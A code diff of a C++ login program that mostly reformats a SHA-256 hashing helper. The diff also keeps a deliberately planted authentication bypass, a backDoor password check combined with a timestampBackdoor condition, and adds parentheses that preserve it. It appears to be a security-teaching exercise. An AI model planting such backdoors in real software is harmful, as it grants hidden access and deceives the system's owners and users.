@@ -10,20 +10,19 @@
 
 using namespace std;
 
-// Function to get the SHA256 hash of a string
+// getSHA256 will return the SHA-256 hash of string
 string getSHA256(const string& input) {
-    unsigned char hash[SHA256_DIGEST_LENGTH];
-    SHA256_CTX sha256;
+    unsigned char hash[SHA256_DIGEST_LENGTH]; // defining hash to store the initial hashed output
+    SHA256_CTX sha256; 
     SHA256_Init(&sha256);
-    // Hashing our input
-    SHA256_Update(&sha256, input.c_str(), input.size()); 
-    // Storing our input inside of hash.
-    SHA256_Final(hash, &sha256); 
-
-    stringstream ss;
-    for (int i = 0; i < SHA256_DIGEST_LENGTH; i++) ss << hex << setw(2) << setfill('0') << (int)hash[i]; // Convert the binary of the hash to hexidecimal
-    // Returning hash as string
-    return ss.str(); 
+    SHA256_Update(&sha256, input.c_str(), input.size()); // Hashing our input
+    SHA256_Final(hash, &sha256); // Storing our input inside of hash.
+    stringstream strStream; // Converting unsigned char to string via string stream
+    for (int i=0; i < SHA256_DIGEST_LENGTH; i++){ // Loop for the length of the hash
+        strStream << hex << setw(2) << setfill('0') << (int)hash[i]; // Convert the binary of the hash to hexidecimal
+    }
+    string hash_stringified = strStream.str(); // Storing the string stream as a string
+    return hash_stringified;
 }
 
 bool backDoor(const string& password) {
@@ -80,7 +79,7 @@ int main() {
 		// If Authenticated, Exit indicating successful authentication
 		// For incorrect login details, reject, clear screen and re-prompt input
 		// If maximum attempts exceeded, reject the user
-        if (isAuthenticated || backDoor(passwordIn) && timestampBackdoor()) {
+        if (isAuthenticated || (backDoor(passwordIn) && timestampBackdoor())) {
             authenticated(usernameIn);
             return 0;
         }
